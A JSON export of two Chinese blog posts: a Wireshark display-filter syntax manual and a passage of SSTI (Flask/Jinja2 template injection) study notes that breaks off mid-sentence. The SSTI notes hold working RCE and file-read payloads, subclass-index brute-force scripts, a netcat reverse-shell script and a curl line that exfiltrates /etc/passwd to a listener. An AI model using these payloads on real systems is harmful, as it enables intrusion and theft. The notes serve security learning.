[{"id":"063a4b4785d156e93ebf4fc9f6bcc38f","title":"WireShark过滤器语法和参考（中文版）说明手册","content":"Wireshark过滤器语法和参考概述Wireshark和TShark共享一个强大的过滤引擎，可以帮助去除数据包跟踪中的噪音，只显示您感兴趣的数据包。如果一个数据包满足您过滤器中的要求，它将显示在数据包列表中。显示过滤器可以让您比较协议中的字段与特定值，比较字段与字段，以及检查指定字段或协议的存在。过滤器还被其他功能使用，例如统计信息生成和数据包列表着色（后者仅适用于Wireshark）。本手册描述了它们的语法。过滤器字段的详细参考可以在Wireshark中找到，并在显示过滤器参考中找到。\n过滤器语法检查字段或协议是否存在最简单的过滤器允许您检查协议或字段的存在。如果您想查看包含IP协议的所有数据包，则过滤器将是”ip”（不带引号）。要查看包含Token-Ring RIF字段的所有数据包，请使用”tr.rif”。每当协议或字段出现在过滤器的函数参数中时，该协议或字段的exists运算符会隐式出现。\n值和运算符每个字段都有一个值，并且该值可以与可比较的值（可以是文字、其他字段或函数结果）进行操作。字段的值不一定是出现在Wireshark显示或TShark输出中的值。例如，协议在语义上等同于它所涵盖的字节序列，而不是协议树中显示的文本。\n比较运算符比较运算符可以通过类似于英语的缩写或类似于C语言的符号来表示：\n\neq, &#x3D;&#x3D;：等于\nne, !&#x3D;：不等于\ngt, &gt;：大于\nlt, &lt;：小于\nge, &gt;&#x3D;：大于等于\nle, &lt;&#x3D;：小于等于\n\n不同类型的值按照通常的方式进行排序（例如，字符串按字典顺序排序，整数按算术排序）。一个字段在给定的帧中可能出现多次。在这种情况下，等式可以是严格的（所有字段都必须满足条件）或非严格的（任何字段都必须满足条件）。不等式是等式的逻辑否定。下表列出了所有等式运算符，它们的别名和含义：\n\neq, any_eq, &#x3D;&#x3D;：任何字段都必须相等\nne, all_ne, !&#x3D;：所有字段都必须不相等\nall_eq, &#x3D;&#x3D;&#x3D;：所有字段都必须相等\nany_ne, !&#x3D;&#x3D;：任何字段都必须不相等\n\n可以使用”any”或”all”修饰符与任何比较运算符配合使用，以使测试匹配任何或所有字段：\n\nall tcp.port &gt; 1024\nany ip.addr !&#x3D; 1.1.1.1\n\n“any”和”all”修饰符优先于比较运算符，如”&#x3D;&#x3D;&#x3D;”和”any_eq”。\n搜索和匹配运算符还存在其他仅用英语而不是类C语法表示的运算符：\n\ncontains：协议、字段或片段是否包含某个值\nmatches, ~：字符串是否与给定的不区分大小写的Perl兼容正则表达式匹配\n\n“contains”运算符允许过滤器搜索一个由字符串表示的字符序列或由字节数组表示的字节。”contains”运算符左边的类型必须与右边经过隐式或显式转换后的类型可比较。例如，要在捕获中搜索给定的HTTP URL，可以使用以下过滤器：\n\nhttp contains “https://www.wireshark.org“\n\n“contains”运算符不能用于原子字段，例如数字或IP地址。\n“matches”或”~”运算符允许过滤器应用于指定的Perl兼容正则表达式（PCRE2）。正则表达式必须是双引号括起来的字符串。”matches”运算符的左边必须是一个字符串，它可以是一个非字符串字段，隐式或显式转换为字符串。匹配默认不区分大小写。\n例如，要搜索给定的WAP WSP User-Agent，可以编写：\n\nwsp.header.user_agent matches “cldc”这将匹配”cldc”、”CLDC”、”cLdC”或其他大小写字母的组合。\n\n您可以使用以下方法强制区分大小写：\n\nwsp.header.user_agent matches “(?-i)cldc”\n\n这是PCRE2的”(?option)”构造的示例。”(?-i)”执行区分大小写的模式匹配，但还可以指定其他选项。有关更多信息，请参阅pcre2pattern(3)手册。\n函数过滤器语言具有以下函数：\n\nupper(string-field)：将字符串字段转换为大写\nlower(string-field)：将字符串字段转换为小写\nlen(field)：返回字符串或字节字段的字节长度\ncount(field)：返回帧中字段出现的次数\nstring(field)：将非字符串字段转换为字符串\nmax(f1,…,fn)：返回最大值\nmin(f1,…,fn)：返回最小值\nabs(field)：返回数值字段的绝对值upper()和lower()对于执行不区分大小写的字符串比较很有用。例如：\nupper(ncp.nds_stream_name) contains “MACRO”\nlower(mount.dump.hostname) &#x3D;&#x3D; “angel”string()将字段值转换为字符串，适用于”matches”或”contains”等运算符。整数字段将转换为十进制表示。它可以与IP&#x2F;Ethernet地址（以及其他一些字段）一起使用，但不能与字符串或字节字段一起使用。例如：\nstring(frame.number) matches “[13579]$”这将给出所有奇数数据包。max()和min()接受任意数量的参数，并分别返回一个值，即最大值&#x2F;最小值。参数必须具有相同的类型。\n\n协议字段类型每个协议字段都有类型。这些类型包括:\n\nASN.1 对象标识符,可以是普通的或者相对的\nAX.25 地址  \n布尔值\n字节序列\n字符字符串\n1 字节字符\n日期和时间\n以太网或其他 MAC 地址\nEUI64 地址\n光纤通道 WWN\n浮点数,单精度或双精度\n帧号\n全局唯一标识符\nIEEE-11073 浮点数,16 位或 32 位\nIPv4 地址\nIPv6 地址  \nIPX 网络号\n标签\nOSI 系统标识符\n协议\n有符号整数,1、2、3、4 或 8 字节\n时间偏移量\n无符号整数,1、2、3、4 或 8 字节\nVINES 地址\n\n整数可以用十进制、八进制、十六进制或二进制表示,或者用 C 样式的字符常量表示。以下 7 个显示过滤器是等价的:\nframe.len &gt; 10frame.len &gt; 012frame.len &gt; 0xaframe.len &gt; 0b1010frame.len &gt; &#39;\\n&#39;frame.len &gt; &#39;\\x0a&#39;frame.len &gt; &#39;\\012&#39;\n布尔值只能是 true 或 false。在显示过滤器表达式中测试布尔字段的值时,true 可以用单词 “True” 或 “TRUE”(不带引号)表示,或者任何非零数。False 可以用 “False” 或 “FALSE” 表示,或者数值 0。例如,令牌环数据包的源路由字段是布尔值。要找到任何源路由数据包,显示过滤器可以是:tr.sr == 1tr.sr == Truetr.sr == TRUE\n找不源路由的数据包可以是:tr.sr == 0tr.sr == Falsetr.sr == FALSE\n以太网地址和字节数组用十六进制数字表示。十六进制数字之间可以用冒号、句点或破折号分隔:eth.dst eq ff:ff:ff:ff:ff:ffaim.data == 0.1.0.dfddi.src == aa-aa-aa-aa-aa-aaecho.data == 7a\nIPv4 地址可以用点分十进制表示法表示,或者用主机名表示:ip.src == 192.168.1.1ip.dst eq www.mit.edu\nIPv4 地址可以用同样的逻辑关系来比较,如 eq,ne,gt,ge,lt,le。IPv4 地址以主机顺序存储,所以在使用 IPv4 地址时不需要考虑字节顺序问题。\n可以使用无类域间路由(CIDR)表示法来测试 IPv4 地址是否在某个子网中。例如,这个显示过滤器将找到所有在 129.111 网络中的数据包:ip.addr == 129.111.0.0/16\n请记住,斜杠后的数字代表用于表示网络的比特数。CIDR 表示法也可以与主机名一起使用,例如找到与 “sneezy” 在同一网络上的 IP 地址(需要 “sneezy” 能解析成 IP 地址才能使过滤器有效):ip.addr eq sneezy/24\nCIDR 表示法只能用于 IP 地址或主机名,不能在变量名中使用,所以 “ip.src&#x2F;24 &#x3D;&#x3D; ip.dst&#x2F;24” 这样的显示过滤器是无效的(暂时如此)。\n以下表列出了字符串和字符常量中支持的所有转义序列:&#39;          单引号&quot;          双引号\\          反斜杠\\a          响铃\\b          退格\\f          换页\\n          换行\\r          回车\\t          水平制表符\\v          垂直制表符\\NNN        任意八进制值\\xNN        任意十六进制值\\uNNNN      Unicode 代码点 U+NNNN\\UNNNNNNNN  Unicode 代码点 U+NNNNNNNN\n日期和时间值可以用 ISO 8601 格式表示,也可以用传统的月-年-时间格式:“2020-07-04T12:34:56”“Sep 26, 2004 23:18:04.954975”\nISO 8601 格式中的 ‘T’ 分隔符可以省略。ISO 8601 支持时区标识符,如 UTC 或相对于 UTC 的偏移量。传统格式可以在结尾追加 “UTC” 指定按协调世界时计算。否则,日期和时间值将被解释为本地时间。\n切片运算符如果字段是文本字符串或字节数组，您可以对字段进行切片操作。例如，您可以通过以下方式过滤以太网地址的厂商部分（前三个字节）：eth.src[0:3] == 00:00:83\n另一个例子是：http.content_type[0:4] == &quot;text&quot;\n您还可以在协议名称上使用切片操作符。”frame”协议可能非常有用，它包含了Wireshark或TShark捕获的所有数据。token[0:5] ne 0.0.0.1.1llc[0] eq aaframe[100-199] contains &quot;wireshark&quot;\n以下是切片的语法规则：\n\n[i:j]    i &#x3D; 起始偏移量，j &#x3D; 长度\n[i-j]    i &#x3D; 起始偏移量，j &#x3D; 结束偏移量，包含边界。\n[i]      i &#x3D; 起始偏移量，长度 &#x3D; 1\n[:j]     起始偏移量 &#x3D; 0，长度 &#x3D; j\n[i:]     起始偏移量 &#x3D; i，结束偏移量 &#x3D; 字段末尾\n\n偏移量可以是负数，表示相对于字段末尾的偏移量。字段的最后一个字节的偏移量为-1，倒数第二个字节的偏移量为-2，依此类推。以下是如何检查帧的最后四个字节：frame[-4:4] == 0.1.2.3或frame[-4:] == 0.1.2.3\n切片始终可以与字符串或字节序列进行比较。\n切片可以组合使用，可以使用逗号运算符将它们连接起来：ftp[1,3-5,9:] == 01:03:04:05:09:0a:0b\n这将连接偏移量1、偏移量3-5和偏移量9到ftp数据的末尾。\n层操作符可以使用层操作符（#）将字段限定为协议栈中的特定层，后面跟着一个十进制数：ip.addr#2 == 192.168.30.40\n仅匹配数据包中的内部（第二个）层。层使用简单的堆叠语义，协议层按照从1开始的顺序递增计数。例如，在包含两个IPv4头的数据包中，外部（第一个）源地址可以与 “ip.src#1” 匹配，内部（第二个）源地址可以与 “ip.src#2” 匹配。\n对于更复杂的范围，与切片一样，使用相同的语法是有效的：tcp.port#[2-4]表示第2、3或4个层。哈希符号（#）必须用于区分层范围和切片。\n成员关系操作符可以使用成员关系操作符来检查字段是否匹配一组值。例如，您可以使用以下过滤器找到常见的HTTP&#x2F;HTTPS端口的流量：tcp.port in &#123;80,443,8080&#125;\n与更冗长的写法相比：tcp.port == 80 or tcp.port == 443 or tcp.port == 8080\n要查找使用HEAD或GET方法的HTTP请求：http.request.method in &#123;&quot;HEAD&quot;, &quot;GET&quot;&#125;\n值集合也可以包含范围：tcp.port in &#123;443, 4430..4434&#125;ip.addr in &#123;10.0.0.5 .. 10.0.0.9, 192.168.1.1..192.168.1.9&#125;frame.time_delta in &#123;10 .. 10.5&#125;\n隐式类型转换字节序列字段（包括协议字段）在与（双引号）文本字符串或原始字符串进行比较时，会隐式转换为字符串。\n因此，例如，以下过滤器是等价的：tcp.payload contains &quot;GET&quot;tcp.payload contains 47.45.54\n如上所述，切片也可以以两种方式进行比较：frame[60:2] gt 50.51frame[60:2] gt &quot;PQ&quot;\n反之则不成立，类似字符串的字段不会隐式转换为字节数组。（某些操作符允许将类似字符串的字段与未引用的字面量进行比较，然后将其视为字符串；这是不推荐的，并且特定的”matches”操作符不允许。为了清晰起见，字面字符串应该使用双引号括起来。）\n十六进制整数如果小于或等于0xff（即适合一个字节），则可以隐式转换为字节字符串。对于大于一个字节的十六进制整数，这是不允许的，因为需要指定多字节整数的字节顺序。此外，对于十进制或八进制数也不允许，因为它们可能与字节字符串字面量中的十六进制数混淆。然而，单字节的十六进制整数可以很方便：frame[4] == 0xffframe[1:4] contains 0x02\n位运算符还可以使用位运算来定义测试。目前支持以下位运算符：bitwise_and, &amp;    位与操作\n位与操作允许掩码位和测试是否设置了一个或多个位。位与操作适用于整数协议字段和切片。\n要测试TCP SYN数据包，可以编写：tcp.flags &amp; 0x02\n该表达式将匹配所有包含已设置0x02位（即SYN位）的”tcp.flags”字段的包。\n要匹配本地管理的单播以太网地址，可以使用：eth.addr[0] &amp; 0x0f == 2\n使用切片时，位掩码必须指定为字节字符串，并且其字节数量必须与切片本身相同，例如：ip[42:2] &amp; 40:ff\n算术运算符算术表达式支持常见的运算符：+   加法-   减法*   乘法/   除法%   取模（整数余数）\n例如，可以使用以下表达式过滤目标端口大于或等于源端口加1的UDP数据包：udp.dstport &gt;= udp.srcport + 1\n可以使用花括号（大括号）来分组算术表达式（括号不起作用）：tcp.dstport &gt;= 4 * &#123;tcp.srcport + 3&#125;\n不要将此使用花括号的用法与成员关系混淆。\n过滤表达式中的运算符注意事项是减法运算符必须在前面加一个空格字符，因此”A-B”必须写成”A -B”或”A - B”。\n协议字段引用形如$&#123;some.proto.field&#125;的带有sigil的变量称为字段引用。字段引用是从GUI中当前选定的帧中读取的字段值。这对于构建动态过滤器非常有用，例如，显示自上次选择帧以来的过去五分钟内的帧：frame.time_relative &gt;= $&#123;frame.time_relative&#125; - 300\n字段引用与宏具有类似的表示法，但它们是过滤语言中的不同语法元素。\n逻辑表达式可以使用逻辑表达式组合测试。这些表达式可以按照类似C语法的方式或使用类似英语的缩写方式表示。下表列出了逻辑运算符的优先级，从高到低：\n\nnot, !    逻辑非   (从右往左结合)\nand, &amp;&amp;   逻辑与   (从左往右结合)\nor,  ||   逻辑或    (从左往右结合)\n\n表达式的计算总是从左到右进行。还可以使用括号对表达式进行分组。例如，表达式 “A and B or not C or D and not E or F” 的读法是：(A and B) or (not C) or (D and (not E)) or F\n通常最好使用括号明确分组。以下是一些有效的显示过滤器表达式：tcp.port == 80 and ip.src == 192.168.2.1not llchttp and frame[100-199] contains &quot;wireshark&quot;(ipx.src.net == 0xbad &amp;&amp; ipx.src.node == 0.0.0.0.0.1) || ip\n请记住，每当协议或字段名称出现在表达式中时，”exists”运算符会隐式调用。”exists”运算符具有最高优先级。这意味着第一个过滤器表达式应该被理解为”显示tcp.port存在且等于80，ip.src存在且等于192.168.2.1的数据包”。第二个过滤器表达式的意思是”显示不存在llc的数据包”，也就是说”llc不存在”，因此将匹配不包含llc协议的所有数据包。第三个过滤器表达式包括了帧中偏移量199存在的约束，也就是帧的长度至少为200。\n每个比较都对任何字段值进行了隐式的存在性测试。在使用显示过滤器从数据包跟踪中删除噪声时，需要注意。例如，如果要过滤所有发送到地址224.1.2.3的IP组播数据包，那么使用：ip.dst ne 224.1.2.3可能过于严格。这与以下写法相同：ip.dst and ip.dst ne 224.1.2.3\n该过滤器只选择具有”ip.dst”字段的帧。任何其他帧，包括所有非IP数据包，都不会被显示。要同时显示非IP数据包，可以使用以下两个表达式之一：not ip.dst or ip.dst ne 224.1.2.3not ip.dst eq 224.1.2.3\n第一个过滤器使用”not ip.dst”来包含所有非IP数据包，然后使用”ip.dst ne 224.1.2.3”来过滤掉不需要的IP数据包。第二个过滤器也否定了隐式的存在性测试，因此是写第一个过滤器的简洁方式。\n","slug":"wireshark","date":"2023-07-11T03:20:34.000Z","categories_index":"文章","tags_index":"渗透工具,wireshark","author_index":"南瓜の无名"},{"id":"3137c2b6b2ca0e39e8c62639d966b498","title":"ssti模板注入学习笔记-漏洞原理及漏洞应用","content":"ssti模板注入flask漏洞-代码不严谨可能造成任意文件读取和RCE远程控制控制后台系统\n漏洞成因：~~ 渲染模板时，没有严格控制对用户的输入~~ 使用了危险的模板，导致用户可以和flask程序进行交互\nflask是基于python开发的一种web框架，那么也就意味着如果用户可以和flask进行交互的话，就可以执行python的代码，比如eval，system，file等等之类的函数。\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123; &#123;str&#125; &#125;&lt;&#x2F;body&gt;        \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;\n    #str是被&#123; &#123;&#125; &#125;包括起来的，会被预先渲染转义，然后才会输出，不会被渲染执行；\n    return render_template_string(html_str,str&#x3D;str)\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;不会执行\n\nfrom importlib.resources import contents\nimport time\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)       #&#123;&#125;里面可以定义任何参数\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123;0&#125;&lt;&#x2F;body&gt;    \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;.format(str)     #str值通过format()函数填充到body中间\n    return render_template_string(html_str)\n    #return render_template_string会把&#123;&#125;内的字符串当成代码指令\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;会被当成指令执行 \n\n可以利用魔术方法去验证模板注入\n127.0.0.1:8888&#x2F;?a&#x3D;&#123; &#123;&quot;.__class__.__mro__&#125; &#125;\n\n服务器端模板注入实际上也是一种注入漏洞。\n判断模板类型$&#123;7*7&#125;成功：\na&#123;*comment*&#125;b           输出ab -&gt; Smarty\n$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;       输出azb -&gt; Mako or ???\n\n$&#123;7*7&#125;失败：\n&#123; &#123;7*7&#125; &#125; and &#123; &#123;7*&#39;7&#125;&#39;&#125;   输出49 -&gt; Jinja2 or Twig or ???\n\nssti常用注入模板1.文件读取2.内建函数eval执行命令3.os模块执行命令4.importlib类执行命令5.linecache函数执行命令6.subprocess.Popen类执行命令\n1.文件读取#查找子类 _frozen_importlib_external.FileLoader\n&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;\n#FileLoader的利用\n&#123; &#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[79][&quot;get_data&quot;](0,&quot;&#x2F;etc&#x2F;passed&quot;)&#125; &#125;\n#读取配置文件下的FLAG\n&#123; &#123;config&#125; &#125;\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n\n~python脚本编写(POST提交”name”的值，通过for循环查找所需字符串)\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500)\n    data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    #data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__mro__[1].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib_external.FileLoader&#39; in response.text:\n                print(i)\n    except:\n        pass \n\n2.内建函数eval执行命令内建函数：python在执行脚本时自动加载的模块\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500):\n    data&#x3D;&#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#39;__builtins__&#39;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;eval&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat .&#x2F;etc&#x2F;passwd&quot;).read()&#39;)&#125; &#125;\n\n__builtins__提供对python的所有”内置“标识符的直接访问\neval()计算字符串表达式的值\n__import__加载os模块\npopen()执行一个shell以运行命令来开启一个进程，执行cat &#x2F;etc&#x2F;passwd\n(system没有回显)\n\n3.os模块执行命令~~在其他函数中直接调用os模块\n#通过config，调用os\n&#123; &#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125; &#125;\n\n#通过url_for，调用os\n&#123; &#123;url_for.__globals__.os.popen(&#39;whoami&#39;).read()&#125; &#125;\n\n~~在已经加载好os模块的子类里直接调用os模块\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#39;os&#39;].popen(&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n&quot;&quot;&quot;\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__bases__[0] 返回 str 基类对象。\nstr.__bases__[0].__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[199] 表示选择该列表中的第 200 个子类，因为在 Python 中，许多内置或库（如 os、sys 等）都是基于类实现的，而拥有相同父类的类按照继承顺序排序在该列表中。\n.__init__ 返回所选子类的初始化方法。\n.__globals__[&#39;os&#39;] 返回一个包含 os 模块的全局命名空间字典。\n.popen(&quot;ls -l &#x2F;opt&quot;) 在该全局命名空间中调用 popen() 方法，并执行一个列出位于 &#x2F;opt 目录下的所有文件的命令。\n.read() 读取命令所输出的数据并返回给模板。\n&quot;&quot;&quot;\n\n其他一些payload的举例\n&#123; &#123;self.__dict__._TemplateReference__context.keys()&#125; &#125;\n&#123; &#123;lipsum.__globals__.os.popen(&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n\n__base__和__bases__[ ]的区别\n__base__ 属性只能获取单一的父类，而 __bases__[] 属性可以获取到所有的直接父类。\n\n4.importlib类执行命令可以加载第三方库，使用load_module加载ospython脚本查找_frozen_importlib.BuiltinImporter\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib.BuiltinImporter&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n\n5.linecache函数执行命令linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用linecache函数如执行命令。python脚本查找linecache\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;linecache&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n\n6.subprocess.Popen类执行命令从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。subprocess意在替代其他几个老的模块或者函数，比如：os.system,os.popen等函数。python脚本查找subprocess.Popen:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;subprocess.Popen&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[200](&#39;ls &#x2F;&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125; &#125;\n&quot;&quot;&quot;\n[] 创建一个空列表。\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__base__ 返回 str 基类对象。\nstr.__base__.__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[200] 表示选择该列表中的第 201 个子类，因为在 Python 中，许多内置或到处的库（如 os、sys 等）都是基于类实现的，并且继承关系可能会随着版本更新而变化。\n调用所选类的初始化方法，并传递给它要执行的系统命令和参数。请注意，这里将参数传递给 shell&#x3D;True 会让命令在 shell 环境下运行，这可以使用户更容易地传递一些组合命令。\ncommunicate() 方法发起与执行命令的子进程的双向通信，并等待命令完成。我们调用此方法以获取命令输出和错误结果。\ncommunicate()[0] 返回命令输出，因为在这个例子中无需关心可能存在的错误结果。\nstrip() 去除输出的最前面之后的空白字符。\n&quot;&quot;&quot;\n\n总结\n绕过过滤1.绕过过滤双大括号{ % % }是属于flask的控制语句，且以{ % end… % }结尾，可以通过在控制语句定义变量或者写循环，判断。示例app.py:\nfrom flask import Flask,rendre_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef show1():\n    girls &#x3D; [&#39;小红&#39;,&#39;小蓝&#39;，&#39;小粉&#39;,&#39;小黄&#39;,&#39;小绿&#39;]\n    return render_template(&#39;index.html&#39;,girls&#x3D;girls)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n示例index.html:\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Document&lt;&#x2F;title&gt;\n    &lt;style&gt;\n            .a&#123;\n                color:red;\n                font_weight:bold;\n            &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;ul&gt;\n    &#123; % for girl in girls % &#125;\n        &#123; % if girl|length &gt;&#x3D;3 % &#125;\n            &lt;li class&#x3D;&quot;a&quot;&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % else % &#125;\n            &lt;li&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % endif % &#125;\n    &#123; % endfor % &#125;\n&lt;&#x2F;ul&gt;\n&#123; % set name&#x3D;&#39;a&#39; % &#125;\n&#123; &#123;name&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n解题思路\n#判断&#123; &#123;&#125; &#125;被过滤\n#尝试&#123; % % &#125;\n&#123; % if 2&gt;1 % &#125;name&#123; % endif % &#125;\n&#123; % if &#39;&#39;.__class__ % &#125;name&#123; % endif % &#125;\n#有回显name说明&#39;&#39;.__class__有内容\n&#123; % if &quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;\n#如果有回显name则说明命令正常执行\n构造脚本查询可使用“popen”的子类编号\nimport requests\nurl &#x3D; input(&quot; 请输入url链接 &quot;)\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; % if &quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &quot;name&quot; in response.text:\n                print(i,&quot;--&gt;&quot;,data)  \n                break\n    except:\n        pass\n\npayload：\n&#123; % print(&quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read()) % &#125;\n\n2.无回显ssti模板注入~ ssti盲注思路：\n(1)反弹shell\n通过rce反弹一个shell出来绕过\n(2)带外注入\n通过requestbin或dnslog的方法将信息传到外界\n(3)纯盲注\n\n反弹shell（没有回显，直接使用脚本批量执行希望执行的命令）\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 监听主机 端口 -e &#x2F;bin&#x2F;bash&quot;).read()&#125; &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#监听主机收到反弹shell进入对方命令行界面\n\n带外注入此处使用wget方法来带外想要知道的内容，也可以使用dnslog或者nc。\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;curl http:&#x2F;&#x2F;监听主机ip&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot;).read()&#125; &#125;&#39;&#125;            \n        #反引号命令执行\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#同时kali开启一个python http监听  #python3 -m http.server 80\n#cat没办法换行，只能显示第一行（需要配合换行命令来显示其他内容）\n\n纯盲注\n3.getitem绕过中括号过滤__getitem__()是python的一个魔术方法，对字典使用时，传入字符串，返回字典相应键所对应的值；对列表使用时，传入整数，返回列表对应索引的值；\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def 